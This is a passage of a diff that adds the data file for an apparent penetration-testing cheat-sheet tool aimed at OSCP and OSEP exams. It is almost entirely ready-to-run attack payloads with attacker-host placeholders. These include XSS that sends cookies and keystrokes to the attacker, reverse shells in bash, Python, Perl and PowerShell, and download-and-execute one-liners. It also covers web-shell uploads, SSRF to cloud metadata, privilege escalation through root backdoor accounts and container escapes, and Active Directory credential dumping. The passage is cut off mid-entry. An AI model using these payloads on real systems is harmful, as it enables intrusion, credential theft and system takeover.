+["Curl upload","curl -F 'file=@shell.php' {URL}/upload.php"],
+["Double extension","shell.php.jpg  /  shell.php5  /  shell.phtml  /  shell.pHp"],
+["Magic bytes bypass","python3 -c \"open('shell.php.jpg','wb').write(b'\\xff\\xd8\\xff' + b'<?php system($_GET[chr(99)]); ?>')\""],
+["Null byte","shell.php%00.jpg"],
+["Exiftool metadata inject","exiftool -Comment='<?php echo system($_GET[\"c\"]); ?>' image.jpg -o shell.php.jpg"],
+]},
+{t:"XSS",c:[
+["Basic XSS test","\x3cscript\x3ealert(1)\x3c/script\x3e\n\">\x3cscript\x3ealert(1)\x3c/script\x3e\n'>\x3cscript\x3ealert(1)\x3c/script\x3e"],
+["XSS cookie steal","\x3cscript\x3efetch('http://{LHOST}/?c='+document.cookie)\x3c/script\x3e"],
+["XSS keylogger","\x3cscript\x3edocument.onkeypress=function(e){fetch('http://{LHOST}/?k='+e.key)}\x3c/script\x3e"],
+["XSS filter bypass","<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>"],
+["Stored XSS payload","<img src='x' onerror='var x=new XMLHttpRequest();x.open(\"GET\",\"http://{LHOST}/?c=\"+document.cookie);x.send()'>"],
+]},
+{t:"Command Injection",c:[
+["Basic payloads","; id\n| id\n`id`\n$(id)\n;id;"],
+["Reverse shell","; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"],
+["Blind — ping test","; ping -c 3 {LHOST}"],
+["URL encoded","%3b+id  /  %7cid  /  %60id%60"],
+["Bypass spaces","${IFS}  /  {IFS}  /  $IFS\n;{cat,/etc/passwd}"],
+["Bypass semicolons","cat$IFS/etc/passwd\ncat</etc/passwd"],
+]},
+{t:"SSRF",c:[
+["Internal admin","{URL}/api?url=http://127.0.0.1/admin"],
+["AWS metadata","{URL}/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+["Azure metadata","{URL}/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
+["GCP metadata","{URL}/api?url=http://metadata.google.internal/computeMetadata/v1/"],
+["Internal port scan","{URL}/api?url=http://127.0.0.1:22\n{URL}/api?url=http://127.0.0.1:3306"],
+["SSRF to Redis RCE","{URL}/api?url=dict://127.0.0.1:6379/set:crontab:*/1 * * * * bash -i>&/dev/tcp/{LHOST}/{LPORT} 0>&1"],
+["Localhost bypasses","http://0.0.0.0/  /  http://[::1]/  /  http://127.1/  /  http://0177.0.0.1/\nhttp://2130706433/  (127.0.0.1 decimal)"],
+]},
+{t:"XXE (XML External Entity)",c:[
+["Basic XXE","<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"],
+["XXE SSRF","<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{LHOST}/test\">]><root>&xxe;</root>"],
+["Blind XXE OOB","<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{LHOST}/evil.dtd\"> %xxe;]><root/>"],
+["XXE via SVG upload","<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n  <text>&xxe;</text>\n</svg>"],
+]},
+]},
+// ─── WEB API ATTACKS ────────────────────────────────────────
+{id:"api",label:"API Attacks",icon:"⚡",group:"OSCP+ Core",groups:[
+{t:"REST API Recon",c:[
+["Swagger / OpenAPI docs","curl -s {URL}/swagger.json | python3 -m json.tool\ncurl -s {URL}/openapi.json\ncurl -s {URL}/api/docs\ncurl -s {URL}/v1/api-docs",["new"]],
+["API endpoint bruteforce","gobuster dir -u {URL}/api -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -x json -t 40"],
+["API version enum","curl -s {URL}/v1/users\ncurl -s {URL}/v2/users\ncurl -s {URL}/api/v1/users"],
+["HTTP method test","curl -s -X GET {URL}/api/users\ncurl -s -X POST {URL}/api/users\ncurl -s -X PUT {URL}/api/users/1\ncurl -s -X DELETE {URL}/api/users/1\ncurl -s -X PATCH {URL}/api/users/1"],
+["Headers enum","curl -v {URL}/api/users 2>&1 | grep -E 'Server:|X-Powered|Content-Type|Access-Control'"],
+["ffuf API params","ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '{URL}/api/user?FUZZ=1' -mc 200,302,400,403,500"],
+]},
+{t:"JWT Attacks",c:[
+["Decode JWT (no verify)","echo 'JWT_TOKEN' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool",["new"]],
+["JWT alg=none attack","# Change header: {\"alg\":\"none\",\"typ\":\"JWT\"}\n# Remove signature (keep trailing dot)\n# python3:\nimport base64, json\nheader = base64.b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).decode().rstrip('=')\npayload = base64.b64encode(json.dumps({\"user\":\"admin\",\"role\":\"admin\"}).encode()).decode().rstrip('=')\nprint(f\"{header}.{payload}.\")"],
+["JWT — weak secret brute","hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt"],
+["JWT — HS256 resign with found secret","python3 -c \"\nimport hmac, hashlib, base64, json\nheader = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).decode().rstrip('=')\npayload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')\nsig_input = f'{header}.{payload}'.encode()\nsig = base64.urlsafe_b64encode(hmac.new(b'SECRET', sig_input, hashlib.sha256).digest()).decode().rstrip('=')\nprint(f'{header}.{payload}.{sig}')\""],
+["jwt_tool full test","jwt_tool JWT_TOKEN -t {URL}/api/profile -rh 'Authorization: Bearer JWT_TOKEN' -M at",["new"]],
+["JWT — RS256 to HS256 (pubkey confuse)","# Use jwt_tool:\njwt_tool JWT_TOKEN -X k -pk public_key.pem"],
+]},
+{t:"GraphQL Attacks",c:[
+["GraphQL introspection","curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' | python3 -m json.tool",["new"]],
+["Full schema dump","curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { queryType { name } types { name kind fields { name type { name kind ofType { name kind } } } } } }\"}'"],
+["GraphQL IDOR test","curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{ user(id: 1) { id email password } }\"}'"],
+["GraphQL mutation (modify data)","curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"mutation { updateUser(id:1, role:\\\"admin\\\") { id role } }\"}'"],
+["GraphQL SQLi","curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{ user(id: \\\"1 OR 1=1\\\") { email } }\"}'"],
+["GraphQL batch DoS","# Send 1000 introspection queries in one batch request"],
+["Graphw00f (GraphQL fingerprint)","python3 graphw00f.py -d -f -t {URL}/graphql",["new"]],
+]},
+{t:"OAuth / SSO Attacks",c:[
+["OAuth implicit flow intercept","# Intercept redirect_uri, change to attacker URL\n# Steal access_token from URL fragment",["high"]],
+["OAuth state CSRF","# Remove state parameter from auth request\n# Craft CSRF attack linking victim account"],
+["Open redirect in redirect_uri","{URL}/oauth/auth?response_type=token&client_id=app&redirect_uri=https://{LHOST}"],
+["JWT in OAuth — check expiry","# Decode token, check exp claim\n# Try reuse of old/expired tokens"],
+["SAML — signature wrapping","# Duplicate Assertion, modify first, keep signature on second"],
+]},
+{t:"IDOR & Broken Access",c:[
+["IDOR — ID manipulation","curl -s {URL}/api/user/1 -H 'Authorization: Bearer YOUR_TOKEN'\ncurl -s {URL}/api/user/2 -H 'Authorization: Bearer YOUR_TOKEN'",["high"]],
+["IDOR — UUID predict","curl -s {URL}/api/orders/UUID_HERE -H 'Authorization: Bearer YOUR_TOKEN'"],
+["Mass assignment","curl -s -X PUT {URL}/api/user/1 -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"john\",\"role\":\"admin\",\"balance\":99999}'",["crit"]],
+["HTTP verb tampering","# If PUT/DELETE blocked, try:\ncurl -X PATCH {URL}/api/admin/users/1 -H 'Authorization: Bearer TOKEN' -d '{\"active\":false}'"],
+["API rate limiting bypass","# Add headers: X-Forwarded-For: 1.2.3.4\n# Or: X-Real-IP: 1.2.3.4\ncurl -H 'X-Forwarded-For: 192.168.{LPORT}.1' {URL}/api/login"],
+]},
+]},
+// ─── SHELLS ──────────────────────────────────────────────────
+{id:"shells",label:"Shells",icon:"💀",group:"OSCP+ Core",groups:[
+{t:"Listeners",c:[
+["nc basic","nc -nlvp {LPORT}"],
+["rlwrap nc (arrow keys)","rlwrap nc -nlvp {LPORT}"],
+["pwncat-cs","pwncat-cs -lp {LPORT}"],
+["socat full TTY listener","socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}"],
+["Metasploit handler","msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run -j'"],
+]},
+{t:"Linux Reverse Shells",c:[
+["Bash TCP","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"],
+["Bash mkfifo","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"],
+["Python3","python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""],
+["Perl","perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"],
+["Ruby","ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"],
+["socat connect","socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}"],
+]},
+{t:"Windows Reverse Shells",c:[
+["PowerShell TCP","powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+'PS '+(pwd).Path+'> ';$rb2=([text.encoding]::ASCII).GetBytes($rb);$s.Write($rb2,0,$rb2.Length);$s.Flush()};$c.Close()\""],
+["PS download+exec","powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/shell.ps1')\""],
+["Cmd.exe via PS","cmd /c powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/shell.ps1')\""],
+]},
+{t:"Msfvenom",c:[
+["Windows x64 exe","msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe"],
+["Windows meterpreter","msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o met.exe"],
+["Linux ELF","msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf"],
+["PHP","msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php"],
+["ASPX","msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx"],
+["MSI","msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o evil.msi"],
+["Encoded","msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -e x64/xor_dynamic -i 10 -f exe -o enc.exe"],
+]},
+{t:"TTY Upgrade",c:[
+["Python3 PTY","python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+["Script PTY","script /dev/null -c bash"],
+["Full upgrade (step 1)","# After python3/script PTY: press Ctrl+Z"],
+["Full upgrade (step 2)","stty raw -echo; fg"],
+["Full upgrade (step 3)","reset; export TERM=xterm; stty rows 40 cols 160"],
+]},
+]},
+// ─── LINUX PRIVESC ──────────────────────────────────────────
+{id:"lpe",label:"Linux PrivEsc",icon:"🐧",group:"OSCP+ Core",groups:[
+{t:"Automated Enum",c:[
+["LinPEAS","curl -s http://{LHOST}/linpeas.sh | bash"],
+["pspy (process/cron watch)","./pspy64 -pf -i 1000"],
+["Linux Exploit Suggester","./linux-exploit-suggester.sh"],
+]},
+{t:"Manual Checks",c:[
+["sudo -l ← FIRST THING","sudo -l"],
+["SUID binaries","find / -perm -u=s -type f 2>/dev/null"],
+["Capabilities","getcap -r / 2>/dev/null"],
+["Writable files","find / -writable -type f 2>/dev/null | grep -v proc"],
+["Cron jobs","cat /etc/crontab && ls -la /etc/cron*"],
+["Bash history","cat ~/.bash_history ~/.zsh_history 2>/dev/null"],
+["Password grep","grep -r 'password\\|passwd\\|secret\\|token' /etc /home /var/www 2>/dev/null | grep -v Binary"],
+["SSH keys","find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"],
+]},
+{t:"SUDO Exploits (GTFOBins)",c:[
+["sudo bash","sudo bash  OR  sudo su"],
+["sudo vi","sudo vi\n:!bash"],
+["sudo awk","sudo awk 'BEGIN {system(\"/bin/bash\")}'"],
+["sudo find","sudo find . -exec /bin/bash \\; -quit"],
+["sudo python3","sudo python3 -c 'import os; os.system(\"/bin/bash\")'"],
+["sudo env","sudo env /bin/bash"],
+["sudo tee (write as root)","echo 'hax::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd && su hax"],
+["sudo tar","sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"],
+["sudo zip","sudo zip /tmp/x.zip /tmp/x -T --unzip-command='sh -c /bin/bash'"],
+["sudo rsync","sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"],
+["sudo mysql","sudo mysql -e '\\! /bin/bash'"],
+["sudo git","sudo git -p help\n# Then: !/bin/bash"],
+["sudo strace","sudo strace -o /dev/null /bin/sh"],
+]},
+{t:"SUID Exploits",c:[
+["SUID bash","/bin/bash -p"],
+["SUID find","find . -exec /bin/bash -p \\; -quit"],
+["SUID python","python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"],
+["SUID vim","vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-c\",\"reset; exec bash\")'"],
+["SUID nano (edit /etc/shadow)","nano /etc/shadow\n# Add root password hash"],
+["SUID cp (overwrite /etc/passwd)","cp /etc/passwd /tmp/bak\necho 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd\nsu root2"],
+["SUID env","env /bin/bash -p"],
+]},
+{t:"Capabilities",c:[
+["python3 cap_setuid","python3 -c 'import ctypes; ctypes.CDLL(None).setuid(0); import os; os.system(\"/bin/bash\")'"],
+["perl cap_setuid","perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\"'"],
+["openssl cap read","openssl enc -in /etc/shadow"],
+["node cap_setuid","node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'"],
+]},
+{t:"Cron & PATH Hijack",c:[
+["Inject into writable cron script","echo 'bash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1' >> /path/to/cron.sh"],
+["PATH hijack via cron","echo '#!/bin/bash\nbash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1' > /tmp/faketool\nchmod +x /tmp/faketool\nexport PATH=/tmp:$PATH"],
+["Wildcard injection — tar","cd /vuln/dir\necho '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=bash shell.sh'\necho 'bash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1' > shell.sh"],
+]},
+{t:"Container Escapes (OSEP)",c:[
+["Docker — check if in container","ls /.dockerenv && cat /proc/1/cgroup | grep docker",["osep"]],
+["Docker — mounted socket","ls /var/run/docker.sock\ndocker -H unix:///var/run/docker.sock run -it --rm -v /:/mnt alpine chroot /mnt sh",["osep","crit"]],
+["Docker — privileged escape","# If --privileged flag set:\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhostpath=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\necho \"$hostpath/cmd\" > /tmp/cgrp/release_agent\necho '#!/bin/bash' > /cmd\necho \"bash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1\" >> /cmd\nchmod +x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"",["osep","crit"]],
+["LXC container escape","lxc init ubuntu:16.04 test -c security.privileged=true\nlxc config device add test whatever disk source=/ path=/mnt/root recursive=true\nlxc start test\nlxc exec test -- /bin/bash\nmount -o bind / /mnt/root  # then chroot",["osep"]],
+["runc CVE-2019-5736","# Requires write access to /proc/self/exe in container",["osep"]],
+]},
+{t:"LD_PRELOAD & Library Hijack",c:[
+["LD_PRELOAD (sudo env_keep)","# If sudo preserves LD_PRELOAD:\ncat > /tmp/evil.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\nvoid _init() { setuid(0); system(\"/bin/bash -i\"); }\nEOF\ngcc -shared -nostartfiles -fPIC -o /tmp/evil.so /tmp/evil.c\nsudo LD_PRELOAD=/tmp/evil.so any_allowed_cmd"],
+["Library hijack (writable path)","# Find shared lib with missing path:\nstrace CMD 2>&1 | grep 'No such file' | grep '.so'\n# Create fake .so in writable directory in LD_LIBRARY_PATH"],
+]},
+{t:"Writable /etc/passwd",c:[
+["Generate password hash","openssl passwd -1 hacked\n# OR: python3 -c \"import crypt; print(crypt.crypt('hacked','\\$6\\$salt\\$'))\""],
+["Append to /etc/passwd","echo 'hax:HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hax  # password: hacked"],
+]},
+{t:"NFS & Shared Mounts",c:[
+["NFS no_root_squash","showmount -e {RHOST}\n# Attacker: mount -o rw,vers=2 {RHOST}:/share /tmp/nfs\ncp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash\n# Target: /tmp/nfs/bash -p"],
+]},
+]},
+// ─── WINDOWS PRIVESC ────────────────────────────────────────
+{id:"wpe",label:"Windows PrivEsc",icon:"🪟",group:"OSCP+ Core",groups:[
+{t:"Automated Tools",c:[
+["WinPEAS","winpeas.exe > C:\\Temp\\wp.txt 2>&1"],
+["WinPEAS PS","IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/winPEASx64.ps1')"],
+["PowerUp","IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/PowerUp.ps1')\nInvoke-AllChecks | Out-File -Encoding ASCII C:\\Temp\\powerup.txt"],
+]},
+{t:"Manual Enumeration",c:[
+["whoami + privileges","whoami /all"],
+["System info","systeminfo"],
+["Hotfixes (missing patches)","wmic qfe list brief | findstr /v '3180045'"],
+["Services","sc query state= all"],
+["Network","netstat -ano && ipconfig /all"],
+["Installed software","wmic product get name,version"],
+["AV products","wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState"],
+["AppLocker","Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"],
+["CLM check","$ExecutionContext.SessionState.LanguageMode"],
+]},
+{t:"Token Impersonation",c:[
+["Check SeImpersonatePrivilege","whoami /priv | findstr /i impersonate"],
+["PrintSpoofer64","PrintSpoofer64.exe -i -c cmd",["crit"]],
+["GodPotato","GodPotato.exe -cmd \"cmd /c whoami\"",["crit"]],
+["GodPotato — add admin","GodPotato.exe -cmd \"net localgroup Administrators {USER} /add\""],
+["JuicyPotatoNG","JuicyPotatoNG.exe -t * -p C:\\Temp\\shell.exe"],
+["RoguePotato","RoguePotato.exe -r {LHOST} -e C:\\Temp\\shell.exe -l 9999"],
+["SweetPotato","SweetPotato.exe -a 'whoami'",["new"]],
+["EfsPotato","EfsPotato.exe 'cmd /c whoami'",["new"]],
+["Meterpreter incognito","load incognito\nlist_tokens -u\nimpersonate_token 'DOMAIN\\Admin'"],
+]},
+{t:"Named Pipes (OSEP)",c:[
+["Check for writable pipes","pipelist.exe /accepteula\naccesschk.exe /accepteula -w \\Pipe\\ -v 2>nul",["osep"]],
+["PrintSpooler pipe abuse","# SpoolSample.exe to trigger print spooler pipe connection",["osep"]],
+["Custom pipe server","# Create named pipe server, wait for SYSTEM process to connect\n# Use NtImpersonateThread after connection",["osep"]],
+]},
+{t:"Service Misconfigs",c:[
+["Weak service perms","accesschk.exe /accepteula -ucqv * 2>nul | findstr ALLOW"],
+["Unquoted service path","wmic service get name,pathname,startmode | findstr /i /v unquoted"],
+["Change binary path","sc config SVCNAME binpath= \"C:\\Temp\\shell.exe\"\nsc stop SVCNAME && sc start SVCNAME"],
+["Writable service registry","accesschk.exe /accepteula -uvwk HKLM\\System\\CurrentControlSet\\Services"],
+["DLL hijacking — find missing DLLs","# Run Process Monitor, filter on 'NAME NOT FOUND' + '.dll'\n# Find writable directories in DLL search order",["high"]],
+["DLL hijacking — create DLL","msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f dll -o missing.dll\n# Copy to writable path in service's DLL search order",["high"]],
+]},
+{t:"Registry Exploits",c:[
+["AlwaysInstallElevated","reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"],
+["MSI exploit","msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o evil.msi\nmsiexec /quiet /qn /i evil.msi"],
+["AutoRun keys","reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"],
+["Weak registry perms","Get-Acl HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run | fl"],
+]},
+{t:"Credentials Hunting",c:[
+["Mimikatz logonpasswords","privilege::debug\nsekurlsa::logonpasswords"],
+["Mimikatz SAM dump","privilege::debug\ntoken::elevate\nlsadump::sam"],
+["SAM + SYSTEM + SECURITY","reg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\nreg save HKLM\\SECURITY C:\\Temp\\SECURITY"],
+["cmdkey creds","cmdkey /list"],
+["RunAs saved creds","runas /savecred /user:{DOMAIN}\\Administrator cmd.exe"],
+["Search password in files","findstr /si password *.txt *.xml *.config *.ini 2>nul"],
+["PowerShell history","type C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"],
+["Unattend.xml","type C:\\Windows\\Panther\\Unattend.xml 2>nul\ntype C:\\Windows\\sysprep\\sysprep.xml 2>nul"],
+["WiFi passwords","netsh wlan show profiles\nnetsh wlan show profile name=\"SSID_NAME\" key=clear"],
+["Putty sessions","reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s"],
+["WinSCP passwords","reg query HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions /s"],
+["DPAPI master key decrypt","mimikatz dpapi::masterkey /in:MASTERKEY_FILE /rpc"],
+]},
+{t:"PrintNightmare (CVE-2021-1675)",c:[
+["Check vulnerability","Get-Service -Name Spooler\nImport-Module CVE-2021-1675.ps1",["crit","new"]],
+["PrintNightmare LPE","Invoke-Nightmare -NewUser 'hacker' -NewPassword 'Hacked@123' -DriverName 'PrintMe'",["crit"]],
+["PrintNightmare RCE (remote)","python3 CVE-2021-1675.py {DOMAIN}/{USER}:'{PASS}'@{RHOST} '\\\\{LHOST}\\share\\evil.dll'",["crit"]],
+]},
+{t:"UAC Bypass",c:[
+["UAC check","whoami /groups | findstr /i 'mandatory label'"],
+["fodhelper UAC bypass","# HKCU writable! No admin needed.\nNew-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force\nNew-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(default)' -Value 'cmd /c start C:\\Temp\\shell.exe' -Force\nStart-Process 'C:\\Windows\\System32\\fodhelper.exe'"],
+["CMSTP UAC bypass","cmstp.exe /ni /s C:\\Temp\\payload.inf"],
+["eventvwr UAC bypass","New-Item 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command' -Force\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command' -Name '(default)' -Value 'cmd /c C:\\Temp\\shell.exe' -Force\nStart-Process 'C:\\Windows\\System32\\eventvwr.exe'"],
+]},
+{t:"LAPS & Credential Access",c:[
+["LAPS password read (PowerView)","Get-DomainComputer | Where-Object { $_.'ms-mcs-admpwd' } | Select-Object name,'ms-mcs-admpwd'",["new"]],
+["LAPS all passwords","Get-AdmPwdPassword -ComputerName '*' | Select ComputerName,Password",["new"]],
+["LAPS via CME","crackmapexec ldap {DC} -u {USER} -p '{PASS}' -M laps"],
+]},
+]},
+// ─── ACTIVE DIRECTORY ───────────────────────────────────────
+{id:"adrecon",label:"AD Recon",icon:"🗺",group:"Active Directory",groups:[
+{t:"Initial Recon",c:[
+["CME full enum","crackmapexec smb {DC} -u {USER} -p '{PASS}' --users --groups --shares --pass-pol"],
+["BloodHound.py","bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {DC} -c All --zip"],
+["BloodHound stealth","bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {DC} -c DCOnly --zip"],
+["LDAP all users","ldapsearch -x -H ldap://{DC} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName"],
+]},
+{t:"PowerView",c:[
+["Load","IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/PowerView.ps1')"],
+["Passwords in description","Get-DomainUser | Where{$_.description} | select samaccountname,description"],
+["Kerberoastable","Get-DomainUser -SPN | select samaccountname,serviceprincipalname"],
+["ASREPRoastable","Get-DomainUser -PreauthNotRequired | select samaccountname"],
+["ACL misconfigs","Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights"],
+["Unconstrained delegation","Get-DomainComputer -Unconstrained | select name,dnshostname"],
+["Constrained delegation","Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto"],
+["Domain trusts","Get-DomainTrust | select SourceName,TargetName,TrustDirection"],
+["LAPS readable passwords","Get-DomainComputer | Where-Object { $_.'ms-mcs-admpwd' } | Select name,'ms-mcs-admpwd'"],
+]},
+]},
+{id:"adatk",label:"AD Attacks",icon:"⚔",group:"Active Directory",groups:[
+{t:"Password Spraying",c:[
+["Kerbrute spray","kerbrute passwordspray --dc {DC} -d {DOMAIN} users.txt '{PASS}'"],
+["CME spray","crackmapexec smb {DC} -u users.txt -p '{PASS}' --continue-on-success"],
+]},
+{t:"Kerberoasting",c:[
+["GetUserSPNs","impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {DC} -request -outputfile kerb_hashes.txt"],
+["Rubeus opsec","Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerb.txt"],
+["Crack 13100","hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"],
+]},
+{t:"ASREPRoast",c:[
+["GetNPUsers (no creds)","impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip {DC}"],
+["Crack 18200","hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"],
+]},
+{t:"Relay & Poisoning",c:[
+["Responder","sudo responder -I eth0 -dwv"],
+["Crack NTLMv2","hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt"],
+["ntlmrelayx SAM","impacket-ntlmrelayx -tf relay_targets.txt -smb2support"],
+["ntlmrelayx SOCKS","impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks"],
+["ntlmrelayx LDAP","impacket-ntlmrelayx -t ldap://{DC} --escalate-user {USER}"],
+["mitm6 + LDAP relay","sudo mitm6 -d {DOMAIN} --ignore-nofqdn &\nimpacket-ntlmrelayx -6 -t ldaps://{DC} --delegate-access --add-computer HACKER_PC$"],
+]},
+{t:"DCSync & Dump",c:[
+["secretsdump full","impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{DC}"],
+["secretsdump krbtgt","impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{DC} -just-dc-user krbtgt"],
+["VSS NTDS (stealthy)","vssadmin create shadow /for=C:\ncmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\\ncmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\"],
+["Offline parse","impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL"],
+]},
+{t:"Advanced AD Attacks",c:[
+["ZeroLogon check","python3 zerologon_check.py dc01 {DC}"],
